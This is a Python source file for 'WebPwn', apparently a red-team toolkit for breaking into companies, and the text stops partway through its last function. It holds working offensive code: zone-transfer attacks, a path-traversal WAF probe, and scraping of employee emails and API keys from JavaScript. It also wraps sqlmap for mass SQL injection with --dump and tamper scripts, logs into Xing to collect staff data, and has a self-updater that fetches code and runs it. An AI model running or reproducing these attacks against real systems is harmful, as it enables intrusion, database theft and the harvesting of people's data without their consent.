#!/usr/bin/env python3
# Collection of common pentest tools to get initial foothold into a company
# author: Mesut Cetin, RedTeamer IT Security
# -*- coding: utf-8 -*-

import colorama
import pyfiglet 
import logging
import argparse
import requests
import json
import re
import unicodedata
import argparse
import os
import pathlib
import sys
import subprocess
import random
import time
import platform
import urllib3
import warnings
import socket
import pydig
import dns.resolver
from shutil import which
from subprocess import check_call, STDOUT
from urllib.error import HTTPError
from googlesearch import search
from colorama import Fore, Style
from sys import exit
from bs4 import BeautifulSoup
from unidecode import unidecode
from taser import printx
from taser.logx import setup_fileLogger,setup_consoleLogger
from taser.proto.http import extract_webdomain,web_request,get_statuscode, WebSession
from taser.utils import file_exists,delimiter2dict,delimiter2list,TaserTimeout
from datetime import datetime
from time import sleep
from alive_progress import alive_bar
import xml.etree.ElementTree as ET

# print ASCII banner
def banner():
	ascii_banner = pyfiglet.figlet_format("WebPwn")
	print(Fore.GREEN + ascii_banner)
	print("No technology that's connected to the Internet is unhackable")
	print("- RedTeamer IT Security\n")

# progress bar
def compute():
	for i in range(1000):
		sleep(0.001)
		yield

def progress_bar():
	with alive_bar(1000) as bar:
		for i in compute():
			bar()

# toDo: add selfupdate from git
def check_for_update(repo_owner, repo_name, current_version):
    # GitHub Repository URL
    github_url = f'https://api.github.com/repos/m-cetin/webpwn/releases/latest'

    try:
        # Send a GET request to the GitHub API
        response = requests.get(github_url)
        response.raise_for_status()

        # Parse the JSON response
        release_info = response.json()
        latest_version = release_info['tag_name']

        # Compare versions
        if latest_version != current_version:
            print(f'{Fore.RESET}A newer version ({latest_version}) is available.')
            update_choice = input('Would you like to perform the update? (Y/N): ').strip().lower()

            if update_choice == 'y':
                # Download the latest release
                download_url = release_info['assets'][0]['browser_download_url']
                subprocess.run(['wget', '-O', 'webpwn.py', '-q', download_url])
                print('Update successfully downloaded. Initiating the update...')
                subprocess.run(['python', 'webpwn.py'])
                exit()
            else:
                print('Update declined. The script will not be updated.')

    except Exception as e:
        print(f'Error checking for updates: {str(e)}')

class c:
    PURPLE = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    UNDERLINE = '\033[4m'

# AORT recon tool - credits to D3Ext
# Nameservers Function 
def ns_enum(domain):
    print(c.BLUE + "\n[" + c.END + c.GREEN + "+" + c.END + c.BLUE + "] Trying to discover valid name servers...\n" + c.END)
    sleep(0.2)
    """
    Query to get NS of the domain
    """
    data = ""
    try:
        data = dns.resolver.resolve(f"{domain}", 'NS')
    except:
        pass
    if data:
        for ns in data:
            print(c.YELLOW + str(ns) + c.END)
    else:
        print(c.YELLOW + "Unable to enumerate" + c.END)

# IPs discover Function
def ip_enum(domain):
    print(c.BLUE + "\n[" + c.END + c.GREEN + "+" + c.END + c.BLUE + "] Discovering IPs of the domain...\n" + c.END)
    sleep(0.2)
    """
    Query to get ips
    """
    data = ""
    try:
        data = dns.resolver.resolve(f"{domain}", 'A')
    except:
        pass
    if data:
        for ip in data:
            print(c.YELLOW + ip.to_text() + c.END)
    else:
        print(c.YELLOW + "Unable to enumerate" + c.END)

# Extra DNS info Function
def txt_enum(domain):
    print(c.BLUE + "\n[" + c.END + c.GREEN + "+" + c.END + c.BLUE + "] Enumerating extra DNS information...\n" + c.END)
    sleep(0.2)
    """
    Query to get extra info about the dns
    """
    data = ""
    try:
        data = dns.resolver.resolve(domain, 'TXT')
    except:
        pass
    if data:
        for info in data:
            print(c.YELLOW + info.to_text() + c.END)
    else:
        print(c.YELLOW + "Unable to enumerate" + c.END)

# Function to discover the IPv6 of the target
def ipv6_enum(domain):
    print(c.BLUE + "\n[" + c.END + c.GREEN + "+" + c.END + c.BLUE + "] Getting ipv6 of the domain...\n" + c.END)
    sleep(0.2)
    """
    Query to get ipv6
    """
    data = ""
    try:
        data = pydig.query(domain, 'AAAA')
    except:
        pass
    if data:
        for info in data:
            print(c.YELLOW + info + c.END)
    else:
        print(c.YELLOW + "Unable to enumerate" + c.END)

# Mail servers Function
def mail_enum(domain):
    print(c.BLUE + "\n[" + c.END + c.GREEN + "+" + c.END + c.BLUE + "] Finding valid mail servers...\n" + c.END)
    sleep(0.2)
    """
    Query to get mail servers
    """
    data = ""
    try:
        data = dns.resolver.resolve(f"{domain}", 'MX')
    except:
        pass
    if data:
        for server in data:
            print(c.YELLOW + str(server).split(" ")[1] + c.END)
    else:
        print(c.YELLOW + "Unable to enumerate" + c.END)

# Domain Zone Transfer Attack Function
def axfr(domain):
    print(c.BLUE + "\n[" + c.END + c.GREEN + "+" + c.END + c.BLUE + "] Starting Domain Zone Transfer attack...\n" + c.END)
    sleep(0.2)
    """
    Iterate through the name servers and try an AXFR attack on everyone
    """
    ns_answer = dns.resolver.resolve(domain, 'NS')
    for server in ns_answer:
        ip_answer = dns.resolver.resolve(server.target, 'A')
        for ip in ip_answer:
            try:
                zone = dns.zone.from_xfr(dns.query.xfr(str(ip), domain))
                for host in zone:
                    print(c.YELLOW + "Found Host: {}".format(host) + c.END)
            except Exception as e:
                print(c.YELLOW + "NS {} refused zone transfer!".format(server) + c.END)
                continue

# Modified function from https://github.com/Nefcore/CRLFsuite WAF detector script <3
def wafDetector(domain):
    """
    Get WAFs list in a file
    """
    r = requests.get("https://raw.githubusercontent.com/D3Ext/AORT/main/utils/wafsign.json")
    f = open('wafsign.json', 'w')
    f.write(r.text)
    f.close()

    with open('wafsign.json', 'r') as file:
        wafsigns = json.load(file)

    print(c.BLUE + "\n[" + c.END + c.GREEN + "+" + c.END + c.BLUE + "] Discovering active WAF on the main web page...\n" + c.END)
    sleep(1)
    """
    Payload to trigger the possible WAF
    """
    payload = "../../../../etc/passwd"

    try:
        """
        Check the domain and modify if neccessary 
        """
        if domain.endswith("/") and domain.startswith("https://"):
            response = requests.get(domain + payload, verify=False)
        elif domain.endswith("/") and not domain.startswith("https://"):
            response = requests.get('https://' + domain + payload, verify=False)
        elif not domain.endswith("/") and domain.startswith("https://"):
            response = requests.get(domain + '/' + payload, verify=False)
        elif not domain.endswith("/") and not domain.startswith("https://"):
            response = requests.get('https://' + domain + '/' + payload, verify=False)
    except:
        print(c.YELLOW + "An error has ocurred" + c.END)
        try:
            os.remove('wafsign.json')
        except:
            pass
        return None

    code = str(response.status_code)
    page = response.text
    headers = str(response.headers)
    cookie = str(response.cookies.get_dict())
    """
    Check if WAF has blocked the request
    """
    if int(code) >= 400:
        bmatch = [0, None]
        for wafname, wafsign in wafsigns.items():
            total_score = 0
            pSign = wafsign["page"]
            cSign = wafsign["code"]
            hSign = wafsign["headers"]
            ckSign = wafsign["cookie"]
            if pSign:
                if re.search(pSign, page, re.I):
                    total_score += 1
            if cSign:
                if re.search(cSign, code, re.I):
                    total_score += 0.5
            if hSign:
                if re.search(hSign, headers, re.I):
                    total_score += 1
            if ckSign:
                if re.search(ckSign, cookie, re.I):
                    total_score += 1
            if total_score > bmatch[0]:
                del bmatch[:]
                bmatch.extend([total_score, wafname])

        if bmatch[0] != 0:
            print(c.YELLOW + bmatch[1] + c.END)
        else:
            print(c.YELLOW + "WAF not detected or doesn't exists" + c.END)
    else:
        print(c.YELLOW + "An error has ocurred or unable to enumerate" + c.END)

    try:
        os.remove('wafsign.json')
    except:
        pass

# Use the token
def crawlMails(domain, api_token):
    print(c.BLUE + "\n[" + c.GREEN + "+" + c.BLUE + "] Discovering valid mail accounts and employees..." + c.END)
    """
    Use the api of hunter.io with your token to get valid mails
    """
    sleep(1)
    api_url = f"""https://api.hunter.io/v2/domain-search?domain={domain}&api_key={api_token}"""
    r = requests.get(api_url)
    response_data = json.loads(r.text)
    domain_name = domain.split(".")[0]
    print()
    file = open(f"{domain_name}-mails-data.txt", "w")
    file.write(r.text)
    file.close()

    counter = 0
    for value in response_data["data"]["emails"]:
        if value["first_name"] and value["last_name"]:
            counter = 1
            print(c.YELLOW + value["first_name"] + " " + value["last_name"] + " - " + value["value"] + c.END)
        else:
            counter = 1
            print(c.YELLOW + value["value"] + c.END)
    if counter == 0:
        print(c.YELLOW + "\nNo mails or employees found" + c.END)
    else:
        print(c.YELLOW + "\nMore mail data stored in " + domain_name + "-mails-data.txt" + c.END)

# Function to check subdomain takeover
def subTakeover(all_subdomains):
    """
    Iterate through all the subdomains to check if anyone is vulnerable to subdomain takeover
    """
    vuln_counter = 0
    print(c.BLUE + "\n[" + c.GREEN + "+" + c.BLUE + "] Checking if any subdomain is vulnerable to takeover\n" + c.END)
    sleep(1)
    
    for subdom in all_subdomains:
        try:
            sleep(0.05)
            resquery = dns.resolver.resolve(subdom, 'CNAME')
            for resdata in resquery:
                resdata = (resdata.to_text())
                if subdom[-8:] in resdata:
                    r = requests.get("https://" + subdom, allow_redirects=False)
                    if r.status_code == 200:
                        vuln_counter += 1
                        print(c.YELLOW + subdom + " appears to be vulnerable" + c.END)
                else:
                    pass
        except KeyboardInterrupt:
            sys.exit(c.RED + "\n[!] Interrupt handler received, exiting...\n" + c.END)
        except:
            pass
    
    if vuln_counter <= 0:
        print(c.YELLOW + "No subdomains are vulnerable" + c.END)

# Function to enumerate github and cloud
def cloudgitEnum(domain):
    print(c.BLUE + "\n[" + c.END + c.GREEN + "+" + c.END + c.BLUE + "] Looking for git repositories and public development info\n" + c.END)
    sleep(0.2)
    try:
        r = requests.get("https://" + domain + "/.git/", verify=False)
        print(c.YELLOW + "Git repository URL: https://" + domain + "/.git/ - " + str(r.status_code) + " status code" + c.END)
    except:
        pass
    try:
        r = requests.get("https://bitbucket.org/" + domain.split(".")[0])
        print(c.YELLOW + "Bitbucket account URL: https://bitbucket.org/" + domain.split(".")[0] + " - " + str(r.status_code) + " status code" + c.END)
    except:
        pass
    try:
        r = requests.get("https://github.com/" + domain.split(".")[0])
        print(c.YELLOW + "Github account URL: https://github.com/" + domain.split(".")[0] + " - " + str(r.status_code) + " status code" + c.END)
        #if r.status_code == 200:
            #git_option = input("Do you want to analyze further the github account and its repos? [y/n]: ")
            #if git_option == "y" or git_option == "yes":
                #domain_name = domain.split(".")[0]
                #r = requests.get("https://api.github.com/users/{domain_name}/repos")
                #__import__('pdb').set_trace()
    except:
        pass
    try:
        r = requests.get("https://gitlab.com/" + domain.split(".")[0])
        print(c.YELLOW + "Gitlab account URL: https://gitlab.com/" + domain.split(".")[0] + " - " + str(r.status_code) + " status code" + c.END)
    except:
        pass

# Wayback Machine function
def wayback(domain):
    print(c.BLUE + "\n[" + c.END + c.GREEN + "+" + c.END + c.BLUE + "] Using The Wayback Machine to discover endpoints" + c.END)
    wayback_url = f"http://web.archive.org/cdx/search/cdx?url=*.{domain}/*&output=json&fl=original&collapse=urlkey"
    """
    Get information from Wayback Machine
    """
    try:
        r = requests.get(wayback_url, timeout=20)
        results = r.json()
        results = results[1:]
    except KeyboardInterrupt:
        sys.exit(c.RED + "\n[!] Interrupt handler received, exiting...\n" + c.END)
    except:
        pass

    domain_name = domain.split(".")[0]
    try:
        os.remove(f"{domain_name}-wayback.txt")
    except:
        pass
    for result in results:
        """
        Save data to a file
        """
        file = open(f"{domain_name}-wayback.txt", "a")
        file.write(result[0] + "\n")

    """
    Get URLs and endpoints from URLScan
    """
    try:
        r = requests.get(f"https://urlscan.io/api/v1/search/?q=domain:{domain}", timeout=20)
        myresp = json.loads(r.text)
        results = myresp["results"]

        for res in results:
            url = res["task"]["url"]
            file = open(f"{domain_name}-wayback.txt", "a")
            file.write(url + "\n")
    except:
        pass

    print(c.YELLOW + f"\nAll URLs stored in {domain_name}-wayback.txt" + c.END)
    sleep(0.3)
    # Now filter wayback output to organize endpoints
    print(c.YELLOW + f"\nGetting .json endpoints from URLs..." + c.END)
    sleep(0.5)
    try: # Remove existing file (avoid error when appending data to file)
        os.remove(f"{domain_name}-json.txt")
    except:
        pass
    urls = open(f"{domain_name}-wayback.txt", "r").readlines()
    json_endpoints = []
    for url in urls:
        if ".json" in url and url not in json_endpoints:
            json_endpoints.append(url)
    # Store .json endpoints
    f = open(f"{domain_name}-json-endpoints.txt", "a")
    for json_url in json_endpoints:
        f.write(json_url)
    f.close()
    json_len = len(json_endpoints)
    print(c.YELLOW + f"JSON endpoints stored in {domain_name}-json.txt ({json_len} endpoints)" + c.END)
    sleep(0.4)
    print(c.YELLOW + f"Filtering out URLs to find potential XSS and Open Redirect vulnerable endpoints..." + c.END)
    sleep(0.2)
    wayback_content = open(f"{domain_name}-wayback.txt", "r").readlines()
    redirects_file_exists = 1
    # Check if redirects.json parameters file exists
    if os.path.exists("redirects.json") == False:
        redirects_file_exists = 0
        r = requests.get("https://raw.githubusercontent.com/D3Ext/AORT/main/utils/redirects.json")
        redirects_file = open("redirects.json", "w")
        redirects_file.write(r.text)
        redirects_file.close()

    redirect_urls = []
    redirects_raw = open("redirects.json")
    redirects_json = json.load(redirects_raw)
    for line in wayback_content:
        line = line.strip()
        for json_line in redirects_json["patterns"]:
            if re.findall(rf".*{json_line}.*?", line):
                endpoint_url = re.findall(rf".*{json_line}.*?", line)[0] + "FUZZ"
                if endpoint_url not in redirect_urls:
                    redirect_urls.append(endpoint_url)

    try: # Remove file if exists
        os.remove(f"{domain_name}-redirects.txt")
    except:
        pass
    # Write open redirects filter content
    f = open(f"{domain_name}-redirects.txt", "a")
    for filtered_url in redirect_urls:
        f.write(filtered_url + "\n")
    f.close()
    end_info = len(redirect_urls)
    print(c.YELLOW + f"Open Redirects endpoints stored in {domain_name}-redirects.txt ({end_info} endpoints)" + c.END)

    xss_file_exists = 1
    if os.path.exists("xss.json") == False:
        xss_file_exists = 0
        r = requests.get("https://raw.githubusercontent.com/D3Ext/AORT/main/utils/xss.json")
        xss_file = open("xss.json", "w")
        xss_file.write(r.text)
        xss_file.close()

    # Filter potential XSS
    xss_urls = []
    xss_raw = open("xss.json")
    xss_json = json.load(xss_raw)
    for line in wayback_content:
        line = line.strip()
        for json_line in xss_json["patterns"]:
            if re.findall(rf".*{json_line}.*?", line):
                endpoint_url = re.findall(rf".*{json_line}.*?", line)[0] + "FUZZ"
                if endpoint_url not in xss_urls:
                    xss_urls.append(endpoint_url)

    # Write xss filter content
    f = open(f"{domain_name}-xss.txt", "a")
    for filtered_url in xss_urls:
        f.write(filtered_url + "\n")
    f.close()

    end_info = len(xss_urls)
    print(c.YELLOW + f"XSS endpoints stored in {domain_name}-xss.txt ({end_info} endpoints)" + c.END)
    sleep(0.1)

    if redirects_file_exists == 0:
        os.remove("redirects.json")
    if xss_file_exists == 0:
        os.remove("xss.json")

# Query the domain
def whoisLookup(domain):
    print(c.BLUE + "\n[" + c.END + c.GREEN + "+" + c.END + c.BLUE + "] Performing Whois lookup..." + c.END)
    import whois
    sleep(1.2)

    try:
        w = whois.whois(domain) # Two different ways to avoid a strange error
    except:
        w = whois.query(domain)
    try:
        print(c.YELLOW + f"\n{w}" + c.END)
    except:
        print(c.YELLOW + "\nAn error has ocurred or unable to whois " + domain + c.END)

# Function to thread when probing active subdomains
def checkStatus(subdomain, file):
    try:
        r = requests.get("https://" + subdomain, timeout=2)
        # Just check if the web is up and https
        if r.status_code:
            file.write("https://" + subdomain + "\n")
    except:
        try:
            r = requests.get("http://" + subdomain, timeout=2)
            # Check if is up and http
            if r.status_code:
                file.write("http://" + subdomain + "\n")
        except:
            pass

# Check status function
def checkActiveSubs(domain,doms):
    global file
    import threading

    print(c.BLUE + "\n[" + c.END + c.GREEN + "+" + c.END + c.BLUE + "] Probing active subdomains..." + c.END)

    if len(doms) >= 100:
        subs_total = len(doms)
        option = input(c.YELLOW + f"\nThere are a lot of subdomains to check, ({subs_total}) do you want to check all of them [y/n]: " + c.END)
        
        if option == "n" or option == "no":
            sleep(0.2)
            return
    """ Define filename """
    domain_name = domain.split(".")[0]
    file = open(f"{domain_name}-active-subs.txt", "w")
    """
    Iterate through all subdomains in threads
    """
    threads_list = []
    for subdomain in doms:
        t = threading.Thread(target=checkStatus, args=(subdomain,file))
        t.start()
        threads_list.append(t)
    for proc_thread in threads_list: # Wait until all thread finish
        proc_thread.join()

    print(c.YELLOW + f"\nActive subdomains stored in {domain_name}-active-subs.txt" + c.END)

# Check if common ports are open
def portScan(domain):
    print(c.BLUE + "\n[" + c.END + c.GREEN + "+" + c.END + c.BLUE + "] Scanning most common ports on " + domain + "\n" + c.END)
    """ Define ports array """
    ports = [21,22,23,25,26,43,53,69,80,81,88,110,135,389,443,445,636,873,1433,2049,3000,3001,3306,4000,4040,5000,5001,5985,5986,8000,8001,8080,8081,27017]
    """
    Iterate through the ports to check if are open
    """
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.40)
        result = sock.connect_ex((domain,port))
        if result == 0:
            print(c.YELLOW + "Port " + str(port) + " - OPEN" + c.END)
        sock.close()

# Fuzz a little looking for backups
def findBackups(domain):
    print(c.BLUE + "\n[" + c.END + c.GREEN + "+" + c.END + c.BLUE + "] Looking for common backup files...\n" + c.END)
    back_counter = 0
    hostname = domain.split(".")[0]
    protocols = ["http", "https"]
    filenames = [hostname, domain, "backup", "admin"]
    extensions = ["sql.tar","tar","tar.gz","gz","tar.bzip2","sql.bz2","sql.7z","zip","sql.gz","7z"]
    # Some common backup filenames with multiple extensions
    for protocol in protocols:
        for filename in filenames:
            for ext in extensions:
                url = protocol + "://" + domain + "/" + filename + "." + ext
                try:
                    r = requests.get(url, verify=False)
                    code = r.status_code
                except:
                    continue
                if code != 404:
                    back_counter += 1
                    print(c.YELLOW + url + " - " + str(code) + c.END)

    if back_counter == 0:
        print(c.YELLOW + "No backup files found" + c.END)

# Look for Google Maps API key and test if it's vulnerable
def findSecrets(domain):
    print(c.BLUE + "\n[" + c.END + c.GREEN + "+" + c.END + c.BLUE + "] Trying to found possible secrets and api keys..." + c.END)
    for protocol in ["https", "http"]:
        findSecretsFromUrl(protocol + "://" + domain)

def findSecretsFromUrl(url):
    # Initial request
    try:
        r = requests.get(url, verify=False)
    except:
        return
    js_list = []
    key_counter = 0
    url_list = re.findall(r'src="(.*?)"', r.text) + re.findall(r'href="(.*?)"', r.text)
    # Get JS endpoints
    for endpoint in url_list:
        if ".js" in endpoint and "https://" not in endpoint:
            js_list.append(endpoint)

    if len(js_list) >= 1:
        print(c.YELLOW + "\nDiscovered JS endpoints:" + c.END)
    for js in js_list:
        print(c.YELLOW + url + js + c.END)

    for js_endpoint in js_list:
        try:
            r = requests.get(url + js_endpoint, verify=False)
        except:
            pass
        if "https://maps.googleapis.com/" in r.text:
            maps_api_key = re.findall(r'src="https://maps.googleapis.com/(.*?)"', r.text)[0]
            print(c.YELLOW + "\nMaps API key found: " + maps_api_key + c.END)
            key_counter = 1
        try:
            google_api = re.findall(r'AIza[0-9A-Za-z-_]{35}', r.text)[0]
            if google_api:
                print(c.YELLOW + "\nGoogle api found: " + google_api + c.END)
                key_counter = 1
        except:
            pass
        try:
            google_oauth = re.findall(r'ya29\.[0-9A-Za-z\-_]+', r.text)[0]
            if google_oauth:
                print(c.YELLOW + "\nGoogle Oauth found: " + google_oauth + c.END)
                key_counter = 1
        except:
            pass
        try:
            amazon_aws_url = re.findall(r's3\.amazonaws.com[/]+|[a-zA-Z0-9_-]*\.s3\.amazonaws.com', r.text)[0]
            if amazon_aws_url:
                print(c.YELLOW + "\nAmazon AWS url found on " + js_endpoint + c.END)
                key_counter = 1
        except:
            pass
        try:
            stripe_key = re.findall(r'"pk_live_.*"', r.text)[0].replace('"', '')
            if stripe_key:
                print(c.YELLOW + "\nStripe key found on " + js_endpoint + c.END)
                key_counter = 1
        except:
            pass

    if key_counter != 1:
        print(c.YELLOW + "\nNo secrets found" + c.END)

# Perform basic enumeration
def basicEnum(domain):
    print(c.BLUE + "\n[" + c.END + c.GREEN + "+" + c.END + c.BLUE + "] Performing some basic enumeration...\n" + c.END)
    """
    Use python-Wappalyzer
    """
    try:
        print()
        from Wappalyzer import Wappalyzer, WebPage
        wappalyzer = Wappalyzer.latest()
        webpage = WebPage.new_from_url('https://' + domain)
        info = wappalyzer.analyze_with_versions(webpage)

        if info != "{}":
            print(c.YELLOW + json.dumps(info, sort_keys=True, indent=4) + c.END)
        else:
            print(c.YELLOW + "\nNo common technologies found" + c.END)

        endpoints = ["robots.txt","xmlrpc.php","wp-cron.php","actuator/heapdump","datahub/heapdump","datahub/actuator/heapdump","heapdump","admin/",".env",".config","version.txt","README.md","license.txt","config.php.bak","api/","feed.xml","CHANGELOG.md","config.json","cgi-bin/","env.json",".htaccess","js/","kibana/","log.txt"]
        for end in endpoints:
            r = requests.get(f"https://{domain}/{end}", timeout=4)
            print(c.YELLOW + f"https://{domain}/{end} - " + str(r.status_code) + c.END)
    except:
        print(c.YELLOW + "An error has ocurred or unable to enumerate" + c.END)

# Main Domain Discoverer Function
def SDom(domain,filename):
    print(c.BLUE + "\n[" + c.END + c.GREEN + "+" + c.END + c.BLUE + "] Discovering subdomains using passive techniques...\n" + c.END)
    sleep(0.1)
    global doms
    doms = []
    """
    Get valid subdomains from crt.sh
    """
    try:
        r = requests.get("https://crt.sh/?q=" + domain + "&output=json", timeout=20)
        formatted_json = json.dumps(json.loads(r.text), indent=4)
        crt_domains = sorted(set(re.findall(r'"common_name": "(.*?)"', formatted_json)))
        # Only append new valid subdomains
        for dom in crt_domains:
            if dom.endswith(domain) and dom not in doms:
                doms.append(dom)

    except KeyboardInterrupt:
        sys.exit(c.RED + "\n[!] Interrupt handler received, exiting...\n" + c.END)
    except:
        pass      
    """
    Get subdomains from AlienVault
    """
    try:
        r = requests.get(f"https://otx.alienvault.com/api/v1/indicators/domain/{domain}/passive_dns", timeout=20)
        alienvault_domains = sorted(set(re.findall(r'"hostname": "(.*?)"', r.text)))
        # Only append new valid subdomains
        for dom in alienvault_domains:
            if dom.endswith(domain) and dom not in doms:
                doms.append(dom)
    except KeyboardInterrupt:
        sys.exit(c.RED + "\n[!] Interrupt handler received, exiting...\n" + c.END)
    except:
        pass
    """
    Get subdomains from Hackertarget
    """
    try:
        r = requests.get(f"https://api.hackertarget.com/hostsearch/?q={domain}", timeout=20)
        hackertarget_domains = re.findall(r'(.*?),', r.text)
        # Only append new valid subdomains
        for dom in hackertarget_domains:
            if dom.endswith(domain) and dom not in doms:
                doms.append(dom)        
    except KeyboardInterrupt:
        sys.exit(c.RED + "\n[!] Interrupt handler received, exiting...\n" + c.END)
    except:
        pass    
    """
    Get subdomains from RapidDNS
    """
    try:
        r = requests.get(f"https://rapiddns.io/subdomain/{domain}", timeout=20)
        rapiddns_domains = re.findall(r'target="_blank".*?">(.*?)</a>', r.text)
        # Only append new valid subdomains
        for dom in rapiddns_domains:
            if dom.endswith(domain) and dom not in doms:
                doms.append(dom)          
    except KeyboardInterrupt:
        sys.exit(c.RED + "\n[!] Interrupt handler received, exiting...\n" + c.END)
    except:
        pass
    """
    Get subdomains from Riddler
    """
    try:
        r = requests.get(f"https://riddler.io/search/exportcsv?q=pld:{domain}", timeout=20)
        riddler_domains = re.findall(r'\[.*?\]",.*?,(.*?),\[', r.text)
        # Only append new valid subdomains
        for dom in riddler_domains:
            if dom.endswith(domain) and dom not in doms:
                doms.append(dom)        
    except KeyboardInterrupt:
        sys.exit(c.RED + "\n[!] Interrupt handler received, exiting...\n" + c.END)
    except:
        pass
    """
    Get subdomains from ThreatMiner
    """
    try:
        r = requests.get(f"https://api.threatminer.org/v2/domain.php?q={domain}&rt=5", timeout=20)
        raw_domains = json.loads(r.content)
        threatminer_domains = raw_domains['results']
        # Only append new valid subdomains
        for dom in threatminer_domains:
            if dom.endswith(domain) and dom not in doms:
                doms.append(dom)
    except KeyboardInterrupt:
        sys.exit(c.RED + "\n[!] Interrupt handler received, exiting...\n" + c.END)
    except:
        pass
    """
    Get subdomains from URLScan
    """
    try:
        r = requests.get(f"https://urlscan.io/api/v1/search/?q={domain}", timeout=20)
        urlscan_domains = sorted(set(re.findall(r'https://(.*?).' + domain, r.text)))
        # Only append new valid subdomains
        for dom in urlscan_domains:
            dom = dom + "." + domain
            if dom.endswith(domain) and dom not in doms:
                doms.append(dom)        
    except KeyboardInterrupt:
        sys.exit(c.RED + "\n[!] Interrupt handler received, exiting...\n" + c.END)
    except:
        pass
                
    if filename != None:
        f = open(filename, "a")
    
    if doms:
        """
        Iterate through the subdomains and check the lenght to print them in a table format
        """
        print(c.YELLOW + "+" + "-"*47 + "+")
        for value in doms:
    
            if len(value) >= 10 and len(value) <= 14:
                print("| " + value + "    \t\t\t\t|")
                if filename != None:
                    f.write(value + "\n")
            if len(value) >= 15 and len(value) <= 19:
                print("| " + value + "\t\t\t\t|")
                if filename != None:
                    f.write(value + "\n")
            if len(value) >= 20 and len(value) <= 24:
                print("| " + value + "   \t\t\t|")
                if filename != None:
                    f.write(value + "\n")
            if len(value) >= 25 and len(value) <= 29:
                print("| " + value + "\t\t\t|")
                if filename != None:
                    f.write(value + "\n")
            if len(value) >= 30 and len(value) <= 34:
                print("| " + value + " \t\t|")
                if filename != None:
                    f.write(value + "\n")
            if len(value) >= 35 and len(value) <= 39:
                print("| " + value + "   \t|")
                if filename != None:
                    f.write(value + "\n")
            if len(value) >= 40 and len(value) <= 44:
                print("| " + value + " \t|")
                if filename != None:
                    f.write(value + "\n")
        """
        Print summary
        """
        print("+" + "-"*47 + "+" + c.END)
        print(c.YELLOW + "\nTotal discovered sudomains: " + str(len(doms)) + c.END)
        """
        Close file if "-o" parameter was especified
        """
        if filename != None:
            f.close()
            print(c.BLUE + "\n[" + c.GREEN + "+" + c.BLUE + "] Output stored in " + filename)
    else:
        print(c.YELLOW + "No subdomains discovered through SSL transparency" + c.END)

# Check if the given target is active
def checkDomain(domain):

    try:
        addr = socket.gethostbyname(domain)
    except:
        print(c.YELLOW + "\nTarget doesn't exists or is down" + c.END)
        sys.exit(1)


# sqlmap mass exploitation
def mass_sql_injection(burp_history_xml):
    # create the "exploitation" directory if it doesn't exist
    if not os.path.exists("exploitation"):
        os.makedirs("exploitation")
    # check if sqlmap is installed
    if not os.path.exists("/usr/bin/sqlmap"):
        install = input("sqlmap is not installed. Do you want to install it? (Y/N) ").lower()
        if install == "y":
            subprocess.run(["apt-get", "install", "sqlmap"])
        else:
            print("sqlmap is required to run this function. Exiting.")
            return

    # parse the burp history xml file
    try:
        tree = ET.parse(burp_history_xml)
        root = tree.getroot()
    except:
        print("Error parsing the burp history xml file. Make sure it is in the correct format and try again.")
        return

    # ask the user for sqlmap options
    risk = input("Enter the risk level for sqlmap (default: 3): ")
    if risk == "":
        risk = "3"
    level = input("Enter the level for sqlmap (default: 5): ")
    if level == "":
        level = "5"
    tamper = input("Enter the tamper scripts for sqlmap (default: space2comment,between): ")
    if tamper == "":
        tamper = "space2comment,between"
    threads = input("Enter the number of threads for sqlmap (default: 10): ")
    if threads == "":
        threads = "10"
    more_flags = input("Do you want to set more flags for sqlmap? (Y/N) ").lower()
    if more_flags == "y":
        flags = input("Enter the flags: ")
    else:
        flags = ""

    # run sqlmap with the options
    command = ["sqlmap", "-r", burp_history_xml, "--risk", risk, "--level", level, "--batch", "--skip", "--dump", "--tamper", tamper, "--threads", threads]
    if flags:
        command += flags.split()
    sqlmap = subprocess.Popen(command, stdout=subprocess.PIPE)
    # print the full output of sqlmap
    with open("exploitation/sqli_full_output.txt", "w") as f:
        for line in sqlmap.stdout:
            print(line.decode("utf-8").strip())
            # save the full output of the scan to a file
            f.write(line.decode("utf-8"))

# xingdumper tool from @l4rm4nd
def xing_dumper():
	def login(mail, password):
			s = requests.Session()
			payload = {
				'username': mail,
				'password': password,
				'perm':'0'
			}

			#print('Login:')
			#print("First Request: requesting CSRF token")
			response1 = requests.get('https://login.xing.com/login/api/login')
			#print(response1.cookies)
			cookies_dict = response1.cookies.get_dict()
			cookies_values = list(cookies_dict.values())
			csrf1 = cookies_values[2]
			csrf_check1 = cookies_values[1]
			#print("---------------------------------------------------------------------------------------------------")

			#print("Second Request: Receiving link including Auth: ")
			response2 = requests.post("https://login.xing.com/login/api/login", json=payload, cookies=response1.cookies, headers={"X-Csrf-Token": csrf1, "Content-Type": "application/json; charset=utf-8", "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*,q=0.8", "Accept-Charset":"ISO-8859-1,utf--8;q=0.7,*;q=0.3","Accept-Encoding":"none","Connection":"keep-alive","Accept-Language":"en-US,en;q=0.8"}, allow_redirects=False)
			#print(response2)
			result = re.search('(?<=href=").*?(?=")', response2.text)
			link= result.group(0)
			#print("Success. Authentication Link: ", link)
			#print("---------------------------------------------------------------------------------------------------")

			#print("Third Request: Following Auth Link and receiving Login tken + new CSRF tokens")
			response3 = requests.get(link, allow_redirects=False, cookies=response2.cookies)
			cookies_dict2 = response3.cookies.get_dict()
			cookie_values2 = list(cookies_dict2.values())
			login_token = cookie_values2[2]
			#print("Successfully logged in. Token: ", login_token)
			#print("---------------------------------------------------------------------------------------------------")

			return login_token
	global msuffix
	msuffix = "@" + input("What is the domain name for the email (e.g. google.com): ")
	keyword = input("What is the name of the company you want to pwn (e.g. Google): ")
	try:
		for j in search(keyword+" xing",tld="co.in",num=5,stop=10,pause=1, lang="en"):
			 progress_bar()
			 global key_word
			 if j.startswith('https://www.xing.com/pages'):
				 global url
				 url = j
				 key_word = keyword
				 break
			 else:
				 print(Fore.RED + "Company not found!")
				 print(Fore.RESET)
				 url = input("What is the XING url (e.g. https://www.xing.com/pages/COMPANYNAME): ")
				 key_word = keyword
				 break
	except HTTPError as err:
		if err.code == 429:
			print(Fore.RED + "[-] You are rate limited! Try changing your IP address or wait a few minutes and then retry!")
			print(Fore.RESET)
			exit(-1)
		else:
			raise

	print(Fore.GREEN + "\nFound URL: ",url)
